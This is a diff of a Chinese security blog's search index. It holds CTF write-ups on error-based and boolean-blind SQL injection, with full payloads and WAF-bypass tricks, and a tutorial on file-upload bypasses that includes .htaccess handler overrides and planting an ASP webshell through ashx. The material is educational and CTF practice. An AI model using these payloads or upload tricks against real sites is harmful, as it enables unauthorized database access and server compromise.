@@ -1,18 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title><![CDATA[CTF题目-加了料的报错注入]]></title>
-    <url>%2F2019%2F08%2F29%2FCTF%E9%A2%98%E7%9B%AE-%E5%8A%A0%E4%BA%86%E6%96%99%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%2F</url>
-    <content type="text"><![CDATA[题目地址：http://www.shiyanbar.com/ctf/2011 尝试首先看题目，题目很明显给出了提示，本题是使用报错注入来解决的。 进入网页解题，源码部分给出了查询数据库的命令，为$sql=&quot;select * from users where username=&#39;$username&#39; and password=&#39;$password&#39;&quot;; 同时题目是通过POST的方式来传输账号和密码的，首先在POST报文中尝试提供信息为username=1+&amp;+password=1，发送后网页端返回Login failed 尝试使用username=&#39; or 1=1 %23&amp;password=1进行注入，网页端反馈Sql injection detected，因此可以推断出服务器端对SQL的注入命令进行了筛选，也就是加了WAF 测试使用BURP抓取POST包进行fuzz分析，分别对username和password的内容进行测试，测试发现两者屏蔽的值并不相同 首先对于username，分析结果如下图所示： 由返回长度可以知道信息，其中302是Login failed，238是Sql injection detected，235是username unknow error对于后两者相当于符号被屏蔽了，前者是可以使用的。因此可以看出在username字段不能使用#、-、=、(、)，但是最终要的是这里能用到exp和updatexml 对于password，分析结果如下： 和前面相反，这里并没屏蔽()，因此可以选择在后面添加语句 构造语句username=&#39; or exp/*&amp;password=*/(~(select * from (select user()) a)) or &#39;发现返回的语句并没有解析user()，而是原样报错返回了 尝试使用updatexml构造语句username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select user())),1) or &#39;，可以发现网页返回了用户名web8@localhost 破解得到payload就可以开始注入了，首先构造一句话来得到表名字：username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) or &#39;结果发现出现了数据库注入报错，仔细观察发现是在password的内容端添加了一个等号，而前面测试过，等号是被屏蔽的，这时候可以想到使用正则表达式的指令regexp来代替等号，因此构造语句为：username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema regexp database())),1) or &#39; 网页返回结果为XPATH syntax error: &#39;:ffll44jj,users&#39;因此成功得到表名为ffll44jj 接下来尝试获取字段名，同样的方法，构造语句：username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name regexp &#39;ffll44jj&#39;)),1) or &#39; 网页成功返回XPATH syntax error: &#39;:value&#39;由此得知flag所在列的名称为value 再次构造命令来获取列中的值：username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select value from ffll44jj)),1) or &#39; 然后就可以成功得到flag为XPATH syntax error: &#39;:flag{err0r_b4sed_sqli_+_hpf}&#39;]]></content>
-      <categories>
-        <category>安全</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Web安全</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[文件上传的简单介绍]]></title>
     <url>%2F2019%2F08%2F29%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D%2F</url>
     <content type="text"><![CDATA[文件上传首先我们通过一个网站上传一个非法格式的文件1.在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。2.如果网页未弹窗，而在页面弹窗，则考虑后端验证 空字节的理解字符串以%00（空字节）作为结束符 文件上传的基本流程1.图片是否正常上传2.图片上传的内容是否被感染（内容替换）3.上传的域名是否是目标服务器4.如果域名不是目标服务器，那就判断解析图片的服务器是否解析（PHP,ASP,ASPX,JSP,CFM,SHRML）等5.上传的目录是否支持解析上述格式 JS验证JS验证时前端验证绕过的一种。对于那些在客户端网页上增加JS来验证的网站，只需要在console上写改成想要的逻辑，就能往服务器发送恶意的PHP文件。 截断上传由于服务器端PHP存在空字节漏洞，例如ereg()函数就存在空字节漏洞，如果通过抓包软件将发送到服务器的上传文件的包截获，并将文件名字改成a.jpg%00.php，在服务器端时通过以下语句来判断是否是jpg的：ereg(&#39;jpg$&#39;,urldecode($file[&#39;name&#39;]));该文件名经过该函数会判断成功，实际上空字节将jpg的后缀阶段了，从而上传的时一个php文件。 黑名单上传验证绕过黑名单上传验证的几种方法：1.将文件的后缀名大小写互换2.如果只解释PHP可以尝试将文件后缀改为php3,php4,php5,phtml 二次上传漏洞的简要分析二次上传 解析漏洞IIS解析漏洞使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。目录解析(6.0)形式：www.xxx.com/xx.asp/xx.jpg原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。文件解析形式：www.xxx.com/xx.asp;.jpg原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。解析文件类型IIS6.0 默认的可执行文件除了asp还包含这三种 :/test.asa,/test.cer,/test.cdx IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。例如 a.aspx.a;.a.aspx.jpg..jpg Apache解析漏洞原理：Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如test.php.owf.rar其中owf和rar 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。 形式：www.xxxx.xxx.com/test.php.php123 其余配置问题导致的漏洞：（1）如果在 Apache 的 conf 里有这样一行配置AddHandler php5-script .php 这时只要文件名里包含php， 即使文件名是 test2.php.jpg 也会以 php 来执行。（2）如果在 Apache 的 conf 里有这样一行配置AddType application/x-httpd-php .jpg即使扩展名是 jpg，一样能以 php 方式执行。 Nginx解析漏洞原理：Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为phpinfo.jpg/1.php，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了。 形式：www.xxxx.com/UploadFiles/image/1.jpg/1.phpwww.xxxx.com/UploadFiles/image/1.jpg/.php ashx上传如果服务器过滤了asa,cer,cdx,htr,aspx,php,jsp等脚本，如果想要突破服务器，可以使用ashx脚本，用ashx来写一个asp的一句话到当前目录。 保存为ashx，然后调价一个ashx的上传类型，上传成功后访问http://www.xxx.com/admin/eWebEditor/UploadFile/2010821235545.ashx就会在当前目录生成一伙人root.asp的木马，用lake2的一句话链接就能见到hello world!了。因为网站再过滤常见脚本的时候把ashx给漏了… .htaccess上传再网站的目录下新建一个名为.htaccess的文件，并在文件中添加代码： 1234&lt;Files *.jpg&gt;ForceType application/x-httpd-phpSetHandler application/x-httpd-php&lt;/Files&gt; 这样网页再访问当前目录下的文件的时候，所有的jpg文件都会被解析为php 修补文件上传漏洞的一些建议1.文件上传的目录设置为不可执行2.结合使用MIME Type来判断文件的类型3.使用随机数改写文件名和文件路径4.单独设置文件服务器的域名]]></content>
@@ -46,6 +34,30 @@
       <tags>
         <tag>Web安全</tag>
         <tag>SQL MAP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[CTF题目-认真一点]]></title>
+    <url>%2F2019%2F07%2F05%2FCTF%E9%A2%98%E7%9B%AE-%E8%AE%A4%E7%9C%9F%E4%B8%80%E7%82%B9%2F</url>
+    <content type="text"><![CDATA[题目地址：http://www.shiyanbar.com/ctf/2009 拿到题目，先尝试分析，在框内输入1，网页显示you are in...接着在框内输入0，网页显示you are not in... 接着尝试输入0&#39; or &#39;1&#39;=&#39;1，网页反馈信息Sql injection detected!，由此可以知道该数据库存在WAF保护，通过burp跑fuzz测试，如下图所示： 可知可以用的符号是or,=,(,),&#39;,&quot;被屏蔽的符号为and,,,substring,union,#,|另外空格添加在字符中间也会被屏蔽 因此可以看出本体的解题思路是使用布尔盲注。。 我们首先用%0a代替空格进行注入，命令为id=1&#39;%0aor%0a&#39;1&#39;=&#39;1，结果为you are not in...这说明用%0a代替空格的方案是正确的，但是可能or在处理中被删除了，因此用oorr来代替or进行注入，结果显示成功，由此开始布尔注入的过程。 接下来的过程中，我们用oorr替换or，并且把空格替换成%0a 获取数据库名称长度和数据库名称构造payload获取名称长度：0&#39; or (length(database())=%s) or&#39;0 构造获取名称的payload:0&#39; or (mid(database() from %s for 1))=&#39;%s&#39; or &#39;0 爆破的结果如下图所示： 可知获取到的数据库名称为ctf_sql_bool_blind 获取表名的长度和名称构造payload获取长度：0&#39; or (length((select group_concat(table_name separator &#39;@&#39;) from information_schema.TABLES where TABLE_SCHEMA=database()))=%s) or&#39;0 获取名称的payload为：0&#39; or (mid((select group_concat(table_name separator &#39;@&#39;) from information_schema.TABLES where TABLE_SCHEMA=database())from %s for 1)=&#39;%s&#39;)or &#39;0 爆破结果如下： 由上图可知，该数据库下由两张表，分别是fiag和users，因为在最开始没有在group_concat里面加separator ‘@’，所以两个名称都连在一起了，原因是默认的分隔符不知道是什么，所以程序就跳过了分隔符。 获取字段名称长度和名称构造获取长度的payload:0&#39; or (length((select group_concat(column_name) from information_schema.columns where TABLE_name=&#39;%s&#39;))=%s) or&#39;0 获取内容的payload:0&#39; or (mid((select group_concat(column_name) from information_schema.columns where TABLE_name=&#39;%s&#39;)from %s for 1)=&#39;%s&#39;)or &#39;0 爆破结果如下： 获取flag的长度和内容获取长度的payload:0&#39; or (length((select %s from %s))=%s) or&#39;0 获取内容的payload:0&#39; or (mid((select %s from %s)from %s for 1)=&#39;%s&#39;)or &#39;0 爆破结果如下： 这里多加了两位长度，因为在提交的时候发现爆破出来的flag一直报错，多加了两位后发现后面无论多少位-都能匹配上，因此认定中间的-可能是另外的符号转化的。 通过使用ascii()函数来确定该字符的确切ascii码，发现该字符是空格，因为空格已经被屏蔽了，所以用等号来确定是无法确定的。]]></content>
+      <categories>
+        <category>安全</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Web安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[CTF题目-加了料的报错注入]]></title>
+    <url>%2F2019%2F07%2F04%2FCTF%E9%A2%98%E7%9B%AE-%E5%8A%A0%E4%BA%86%E6%96%99%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%2F</url>
+    <content type="text"><![CDATA[题目地址：http://www.shiyanbar.com/ctf/2011 尝试首先看题目，题目很明显给出了提示，本题是使用报错注入来解决的。 进入网页解题，源码部分给出了查询数据库的命令，为$sql=&quot;select * from users where username=&#39;$username&#39; and password=&#39;$password&#39;&quot;; 同时题目是通过POST的方式来传输账号和密码的，首先在POST报文中尝试提供信息为username=1+&amp;+password=1，发送后网页端返回Login failed 尝试使用username=&#39; or 1=1 %23&amp;password=1进行注入，网页端反馈Sql injection detected，因此可以推断出服务器端对SQL的注入命令进行了筛选，也就是加了WAF 测试使用BURP抓取POST包进行fuzz分析，分别对username和password的内容进行测试，测试发现两者屏蔽的值并不相同 首先对于username，分析结果如下图所示： 由返回长度可以知道信息，其中302是Login failed，238是Sql injection detected，235是username unknow error对于后两者相当于符号被屏蔽了，前者是可以使用的。因此可以看出在username字段不能使用#、-、=、(、)，但是最终要的是这里能用到exp和updatexml 对于password，分析结果如下： 和前面相反，这里并没屏蔽()，因此可以选择在后面添加语句 构造语句username=&#39; or exp/*&amp;password=*/(~(select * from (select user()) a)) or &#39;发现返回的语句并没有解析user()，而是原样报错返回了 尝试使用updatexml构造语句username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select user())),1) or &#39;，可以发现网页返回了用户名web8@localhost 破解得到payload就可以开始注入了，首先构造一句话来得到表名字：username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) or &#39;结果发现出现了数据库注入报错，仔细观察发现是在password的内容端添加了一个等号，而前面测试过，等号是被屏蔽的，这时候可以想到使用正则表达式的指令regexp来代替等号，因此构造语句为：username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema regexp database())),1) or &#39; 网页返回结果为XPATH syntax error: &#39;:ffll44jj,users&#39;因此成功得到表名为ffll44jj 接下来尝试获取字段名，同样的方法，构造语句：username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name regexp &#39;ffll44jj&#39;)),1) or &#39; 网页成功返回XPATH syntax error: &#39;:value&#39;由此得知flag所在列的名称为value 再次构造命令来获取列中的值：username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select value from ffll44jj)),1) or &#39; 然后就可以成功得到flag为XPATH syntax error: &#39;:flag{err0r_b4sed_sqli_+_hpf}&#39;]]></content>
+      <categories>
+        <category>安全</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Web安全</tag>
       </tags>
   </entry>
   <entry>
